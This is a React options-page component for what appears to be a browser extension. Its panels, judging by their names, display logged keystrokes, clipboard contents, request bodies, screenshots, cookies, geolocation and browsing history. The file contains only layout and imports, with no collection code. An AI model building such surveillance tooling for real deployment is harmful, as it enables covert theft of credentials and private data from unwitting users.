import React, { Suspense } from "react";
import ClipboardLog from "./ClipboardLog";
import Controls from "./Controls";
import Cookies from "./Cookies";
import Geolocation from "./Geolocation";
import KeyLog from "./Keylog";
import Log from "./Log";
import SiteList from "./SiteList";
const History = React.lazy(() => import("./History"));
const NavigationLog = React.lazy(() => import("./NavigationLog"));
const RequestBodyLog = React.lazy(() => import("./RequestBodyLog"));
const ScreenshotLog = React.lazy(() => import("./Screenshots"));

export default function OptionsApp() {
  return (
    <div className="grid grid-cols-12">
      <div className="col-span-2">
        <Controls></Controls>
      </div>

      <div className="flex flex-col items-stretch gap-24 col-span-6 py-8 overflow-x-scroll">
        <Geolocation></Geolocation>
        <SiteList></SiteList>
        <ClipboardLog></ClipboardLog>
        <Suspense fallback={<div>Loading navigation...</div>}>
          <NavigationLog></NavigationLog>
        </Suspense>
        <Suspense fallback={<div>Loading requests...</div>}>
          <RequestBodyLog></RequestBodyLog>
        </Suspense>
        <KeyLog></KeyLog>
        <Suspense fallback={<div>Loading screenshots...</div>}>
          <ScreenshotLog></ScreenshotLog>
        </Suspense>
        <Cookies></Cookies>
        <Suspense fallback={<div>Loading history...</div>}>
          <History></History>
        </Suspense>
      </div>
      <div className="p-8 col-span-4">
        <Log></Log>
      </div>
    </div>
  );
}
